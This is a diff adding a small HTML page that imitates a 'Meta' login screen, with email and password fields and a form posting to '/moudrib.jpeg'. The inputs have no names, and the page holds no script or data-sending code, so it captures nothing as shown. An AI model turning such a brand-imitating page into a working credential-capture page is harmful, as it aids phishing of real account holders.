@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta Login</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      .login-container {
+        border: 1px solid #d4d4d4;
+        padding: 40px;
+        width: 300px;
+        border-radius: 5px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .meta-logo {
+        font-size: 2em;
+        color: #007bff;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .login-description {
+        text-align: center;
+        margin-bottom: 30px;
+      }
+
+      .text,
+      .password {
+        width: 93%;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #d4d4d4;
+      }
+
+      .login-btn {
+        width: 100%; /* Make the button width the same as the input fields */
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #d4d4d4;
+        background-color: #007bff;
+        /* border: none; */
+        color: #ffffff;
+        cursor: pointer;
+        box-sizing: border-box;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="meta-logo">∞ Meta</div>
+      <div class="login-description">Login to access your account</div>
+      <form action="/moudrib.jpeg" method="post">
+        <label>Email</label>
+        <input type="text" class="text" placeholder="Enter email" />
+        <label>Password</label>
+        <input type="password" class="password" placeholder="Enter" />
+        <button class="login-btn" type="submit">Continue</button>
+      </form>
+    </div>
+  </body>
+</html>
